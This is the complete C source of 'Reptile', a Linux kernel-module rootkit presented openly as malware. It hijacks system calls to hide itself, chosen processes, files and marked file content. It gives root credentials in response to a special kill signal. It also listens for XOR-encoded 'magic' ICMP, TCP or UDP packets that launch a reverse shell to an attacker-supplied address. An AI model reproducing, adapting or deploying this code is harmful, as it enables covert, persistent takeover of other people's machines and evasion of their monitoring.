/* REPTILE ROOTKIT
 *
 * A LKM Linux rootkit
 * Author: F0rb1dd3n
 *
 */

#include <linux/module.h> 
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <asm/pgtable.h>
#include <linux/slab.h>
#include <linux/cred.h>
#include <asm/uaccess.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/file.h>
#include <linux/workqueue.h>
#include <linux/init.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/string.h>
#include "sbin/config.h"

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
	#include <linux/proc_ns.h>
#else
	#include <linux/proc_fs.h>
#endif
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 26)
	#include <linux/fdtable.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20)
    	#define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (void (*)(void *))(_f), (_t))
#else
    	#define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (_f))
#endif

#define bzero(b,len) (memset((b), '\0', (len)), (void) 0)
#define SIGROOT		48
#define SIGHIDEPROC 	49
#define SIGHIDEREPTILE 	50
#define SIGHIDECONTENT  51
#define SSIZE_MAX 	32767

int hidden = 0, hide_file_content = 1;
struct workqueue_struct *work_queue;
static struct nf_hook_ops magic_packet_hook_options;
static struct list_head *mod_list;
static unsigned long *sct;
atomic_t read_on;

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
	#define SYM_NAME "vfs_read"
    	asmlinkage size_t (*vfs_read_addr)(struct file *file, char __user *buf, size_t count, loff_t *pos);
#endif

asmlinkage int (*o_kill)(pid_t pid, int sig);
asmlinkage int (*o_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
asmlinkage int (*o_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
asmlinkage ssize_t (*o_read)(unsigned int fd, char __user *buf, size_t count);

asmlinkage int l33t_kill(pid_t pid, int sig);
asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
asmlinkage ssize_t l33t_read(unsigned int fd, char __user *buf, size_t count);

struct shell_task {
    	struct work_struct work;
    	char *path;
    	char *ip;
    	char *port;
};

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

void hide(void) {
	if(hidden) return;

	mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
        THIS_MODULE->sect_attrs = NULL;  	
	hidden = 1;
}

void show(void) {
	if(!hidden) return;

	list_add(&THIS_MODULE->list, mod_list);
	hidden = 0;
}

struct task_struct *find_task(pid_t pid){
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid) return p;
	}
	return NULL;
}

int is_invisible(pid_t pid){
	struct task_struct *task;
	if (!pid) return 0;
	task = find_task(pid);
	if (!task) return 0;
	if (task->flags & 0x10000000) return 1;
	return 0;
}

void exec(char **argv){
	static char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

void shell_execer(struct work_struct *work) {
    	struct shell_task *task = (struct shell_task *)work;
    	char *argv[] = { task->path, "-t", task->ip, "-p", task->port, NULL };

    	exec(argv);
    	if(task) kfree(task);
}

int shell_exec_queue(char *path, char *ip, char *port) {
    	struct shell_task *task;

    	task = kmalloc(sizeof(*task), GFP_KERNEL);
    
    	if(!task) return -1;

    	REPTILE_INIT_WORK(&task->work, &shell_execer);
    	task->path = kstrdup(path, GFP_KERNEL);
    	task->ip = kstrdup(ip, GFP_KERNEL);
    	task->port = kstrdup(port, GFP_KERNEL);

    	return queue_work(work_queue, &task->work);
}

struct file *e_fget_light(unsigned int fd, int *fput_needed) {
    	struct file *file;
    	struct files_struct *files = current->files;

    	*fput_needed = 0;
    	if (likely((atomic_read(&files->count) == 1))) {
        	file = fcheck(fd);
    	} else {
        	spin_lock(&files->file_lock);
        	file = fcheck(fd);
        	if (file) {
           		get_file(file);
            		*fput_needed = 1;
        	}
        	spin_unlock(&files->file_lock);
    	}
    	return file;
}

int f_check(void *arg, int size) {
	char *buf;

	if ((size <= 0) || (size >= SSIZE_MAX)) return(-1);

	buf = (char *) kmalloc(size+1, GFP_KERNEL);
	if(!buf) return(-1);

	if(__copy_from_user((void *) buf, (void *) arg, size)) goto out;

	buf[size] = 0;

	if ((strstr(buf, HIDETAGIN) != NULL) && (strstr(buf, HIDETAGOUT) != NULL)) {
		if(buf) kfree(buf);
		return(1);
	}
out:
	if(buf) kfree(buf);
	return(-1);
}

int hide_content(void *arg, int size) {
	char *buf, *p1, *p2;
	int i, newret;

	buf = (char *) kmalloc(size, GFP_KERNEL);
	if(!buf) return(-1);

	if(__copy_from_user((void *) buf, (void *) arg, size)) {
		if(buf) kfree(buf);
		return size;
	}

	p1 = strstr(buf, HIDETAGIN);
	p2 = strstr(buf, HIDETAGOUT);
	p2 += strlen(HIDETAGOUT);

	i = size - (p2 - buf);
	memmove((void *) p1, (void *) p2, i);
	newret = size - (p2 - p1);

	if(__copy_to_user((void *) arg, (void *) buf, newret)) {
		if(buf) kfree(buf);
		return size;
	}
	if(buf) kfree(buf);
	return newret;
}

void s_xor(char *arg, int key, int nbytes) {
        int i;
        for(i = 0; i < nbytes; i++) arg[i] ^= key;
}

int atoi(char *str){
	int i, result = 0;
	for(i = 0; str[i] != '\0'; i++) result = result*10 + str[i] - '\0';

	return result;
}

void decode_n_spawn(const char *data) {
	int tsize;
	char *ip, *port, *p = NULL, *buf = NULL;  

    	tsize = strlen(TOKEN);
	p = (char *) kmalloc(tsize+24, GFP_KERNEL);
	if(!p) return;

	buf = p; // save the base pointer to free it right

        bzero(buf, tsize+24);
        memcpy(buf, data, tsize+24);
        s_xor(buf, 11, strlen(buf));
	strsep(&buf, " ");
	ip = buf;
	strsep(&buf, " ");
	port = buf;
	strsep(&buf, " ");

        if((atoi(port) > 0 && atoi(port) <= 65535) || (strlen(ip) >= 7 && strlen(ip) <= 15)) shell_exec_queue(SHELL, ip, port);
	if(p) kfree(p);
}

unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *socket_buffer, 
			       const struct net_device *in, const struct net_device *out, 
			       int (*okfn)(struct sk_buff *)) {
    	
	const struct iphdr   *ip_header;
    	const struct icmphdr *icmp_header;
    	const struct tcphdr  *tcp_header;
    	const struct udphdr  *udp_header;
	struct iphdr	_iph;
    	struct icmphdr	_icmph;
	struct tcphdr	_tcph;
	struct udphdr	_udph;
	const char *data;
	char *_dt, *token = TOKEN;
    	int tsize;

    	data = NULL;
    	tsize = strlen(TOKEN);
    	s_xor(token, 11, tsize);

    	if (!socket_buffer) return NF_ACCEPT;

    	ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);

    	if (!ip_header) return NF_ACCEPT;
    	if (!ip_header->protocol) return NF_ACCEPT;

     	if (ip_header->protocol == IPPROTO_ICMP) {
        	icmp_header = skb_header_pointer(socket_buffer, ip_header->ihl*4, sizeof(_icmph), &_icmph);

        	if (!icmp_header) return NF_ACCEPT;

        	data = skb_header_pointer(socket_buffer, ip_header->ihl*4 + sizeof(struct icmphdr), sizeof(_dt), &_dt);

    		if (!data) return NF_ACCEPT;

    		if ((icmp_header->code == ICMP_ECHO) && (memcmp(data, token, tsize) == 0)){
    			decode_n_spawn(data);
			return NF_DROP;
    		}
    	}
     
     	if (ip_header->protocol == IPPROTO_TCP) {
        	tcp_header = skb_header_pointer(socket_buffer, ip_header->ihl*4, sizeof(_tcph), &_tcph);

        	if (!tcp_header) return NF_ACCEPT;

        	data = skb_header_pointer(socket_buffer, ip_header->ihl*4 + sizeof(struct tcphdr), sizeof(_dt), &_dt);
    		
		if (!data) return NF_ACCEPT;

		if(htons(tcp_header->source) == SRCPORT && htons(tcp_header->dest) == TCPPORT && memcmp(data, token, tsize) == 0){
			decode_n_spawn(data);
			return NF_DROP;
		}
    	}
     
     	if (ip_header->protocol == IPPROTO_UDP) {
        	udp_header = skb_header_pointer(socket_buffer, ip_header->ihl*4, sizeof(_udph), &_udph);

        	if (!udp_header) return NF_ACCEPT;

        	data = skb_header_pointer(socket_buffer, ip_header->ihl*4 + sizeof(struct udphdr), sizeof(_dt), &_dt);
    		
		if (!data) return NF_ACCEPT;

		if(htons(udp_header->source) == SRCPORT && htons(udp_header->dest) == UDPPORT && memcmp(data, token, tsize) == 0){
			decode_n_spawn(data);
			return NF_DROP;
		}
    	}
    	return NF_ACCEPT;
}

void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size) {
    	char *p;

    	for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++) {
        	if(memcmp(p, needle, needle_size) == 0) return (void *)p;
    	}
    	return NULL;
}

#if defined(x86_64) || defined(amd64)

unsigned long *find_sys_call_table(void) {
	unsigned long sct_off = 0;
    	unsigned char code[512];
    	char **p;

    	rdmsrl(MSR_LSTAR, sct_off);
    	memcpy(code, (void *)sct_off, sizeof(code));

    	p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
  
    	if(p) {
        	unsigned long *table = *(unsigned long **)((char *)p + 3);
        	table = (unsigned long *)(((unsigned long)table & 0xffffffff) | 0xffffffff00000000);
        	return table;
    	}
    	return NULL;
}

#elif defined(i686) || defined(i386) || defined(x86) 

struct {
	unsigned short limit;
	unsigned long base;
} __attribute__ ((packed))idtr;

struct {
	unsigned short off1;
	unsigned short sel;
    	unsigned char none, flags;
    	unsigned short off2;
} __attribute__ ((packed))idt;

unsigned long *find_sys_call_table(void) {
    	char **p;
    	unsigned long sct_off = 0;
    	unsigned char code[255];

    	asm("sidt %0":"=m" (idtr));
    	memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
    	sct_off = (idt.off2 << 16) | idt.off1;
    	memcpy(code, (void *)sct_off, sizeof(code));

    	p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);

    	if(p) return *(unsigned long **)((char *)p + 3);
    	else return NULL;
}

#endif

unsigned long *generic_find_sys_call_table(void){
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
}

asmlinkage int l33t_kill(pid_t pid, int sig){

	struct task_struct *task;

	switch(sig) {
		case SIGHIDEREPTILE:
			if(hidden) show();
			else hide();
			break;
		case SIGHIDEPROC:
			if((task = find_task(pid)) == NULL) return -ESRCH;

			task->flags ^= 0x10000000;
			break;
		case SIGHIDECONTENT:
			if(hide_file_content) hide_file_content = 0;
			else hide_file_content = 1;
			break;
		case SIGROOT:
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
                	current->uid   = 0;
                	current->suid  = 0;
                	current->euid  = 0;
                	current->gid   = 0;
                	current->egid  = 0;
                	current->fsuid = 0;
                	current->fsgid = 0;
                	cap_set_full(current->cap_effective);
                	cap_set_full(current->cap_inheritable);
                	cap_set_full(current->cap_permitted);
#else
                	commit_creds(prepare_kernel_cred(0));
#endif
			break;
		default:
			return o_kill(pid, sig);
	}
	return 0;
}

asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
	int ret = o_getdents64(fd, dirent, count); 
	unsigned short p = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdir, *prev = NULL;
	struct inode *d_inode;
	char *hide = HIDE;

	if (ret <= 0) return ret;

	kdir = kzalloc(ret, GFP_KERNEL);
	if (kdir == NULL) return ret;

	if(copy_from_user(kdir, dirent, ret)) goto end;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		p = 1;

	while(off < ret) {
		dir = (void *)kdir + off;
		if((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) || (p && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if(dir == kdir) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else {
			prev = dir;
		}
		off += dir->d_reclen;
	}
	if(copy_to_user(dirent, kdir, ret)) goto end;

end:
	if(kdir) kfree(kdir);
	return ret;
}

asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
	int ret = o_getdents(fd, dirent, count);
	unsigned short p = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdir, *prev = NULL;
	struct inode *d_inode;
	char *hide = HIDE;	

	if (ret <= 0) return ret;	

	kdir = kzalloc(ret, GFP_KERNEL);
	if(kdir == NULL) return ret;

	if(copy_from_user(kdir, dirent, ret)) goto end;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	if(d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)) p = 1;

	while(off < ret) {
		dir = (void *)kdir + off;
		if((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) || (p && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if(dir == kdir) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else {
			prev = dir;
		}
		off += dir->d_reclen;
	}
	if(copy_to_user(dirent, kdir, ret)) goto end;

end:	
	if(kdir) kfree(kdir);
	return ret;
}

asmlinkage ssize_t l33t_read(unsigned int fd, char __user *buf, size_t count) {
	struct file *f;
	int fput_needed;
	ssize_t ret;
       
	if(hide_file_content) {
		ret = -EBADF;

		atomic_set(&read_on, 1);
		f = e_fget_light(fd, &fput_needed);

		if (f) {
#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
			ret = vfs_read(f, buf, count, &f->f_pos);
#else
			ret = vfs_read_addr(f, buf, count, &f->f_pos);
#endif			
			if(f_check(buf, ret) == 1) ret = hide_content(buf, ret);
	    	
			fput_light(f, fput_needed);
		}
		atomic_set(&read_on, 0);
	} else {
		ret = o_read(fd, buf, count);
	}

	return ret;
}

static int __init reptile_init(void) { 
	char *argv[] = { START, NULL, NULL };
	
	atomic_set(&read_on, 0);
	sct = (unsigned long *)find_sys_call_table();

	if(!sct) sct = (unsigned long *)kallsyms_lookup_name("sys_call_table");
	if(!sct) sct = (unsigned long *)generic_find_sys_call_table();			
	if(!sct) return -1;
	
    	o_kill = (void *)sct[__NR_kill];
    	o_getdents64 = (void *)sct[__NR_getdents64];
    	o_getdents = (void *)sct[__NR_getdents];
    	o_read = (void *)sct[__NR_read];
		
	write_cr0(read_cr0() & (~0x10000));
	sct[__NR_kill] = (unsigned long)l33t_kill;		
	sct[__NR_getdents64] = (unsigned long)l33t_getdents64;		
	sct[__NR_getdents] = (unsigned long)l33t_getdents;		
	write_cr0(read_cr0() | 0x10000);

    	magic_packet_hook_options.hook     = (void *) magic_packet_hook;
    	magic_packet_hook_options.hooknum  = 0;
    	magic_packet_hook_options.pf       = PF_INET;
    	magic_packet_hook_options.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
    	nf_register_net_hook(&init_net, &magic_packet_hook_options);
#else
    	nf_register_hook(&magic_packet_hook_options);
#endif
    	work_queue = create_workqueue(HIDE);	
	
	exec(argv);

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
    	vfs_read_addr = (void *)kallsyms_lookup_name(SYM_NAME);
#endif

	write_cr0(read_cr0() & (~0x10000));
	sct[__NR_read] = (unsigned long)l33t_read;		
	write_cr0(read_cr0() | 0x10000);

	return 0; 
} 

static void __exit reptile_exit(void) { 
	if(o_kill){
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_kill] = (unsigned long)o_kill;
		write_cr0(read_cr0() | 0x10000);
	}

	if(o_getdents64){
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_getdents64] = (unsigned long)o_getdents64;
		write_cr0(read_cr0() | 0x10000);
	}

	if(o_getdents){
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_getdents] = (unsigned long)o_getdents;
		write_cr0(read_cr0() | 0x10000);
	}

	if(o_read) {
		while(atomic_read(&read_on) != 0) schedule();
		write_cr0(read_cr0() & (~0x10000));
		sct[__NR_read] = (unsigned long)o_read;
		write_cr0(read_cr0() | 0x10000);
	}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_unregister_net_hook(&init_net, &magic_packet_hook_options);
#else
    	nf_unregister_hook(&magic_packet_hook_options);
#endif
    	flush_workqueue(work_queue);
    	destroy_workqueue(work_queue);
}

module_init(reptile_init);
module_exit(reptile_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("F0rb1dd3n - f0rb1dd3n@tuta.io");
MODULE_DESCRIPTION("Reptile - A linux LKM rootkit");
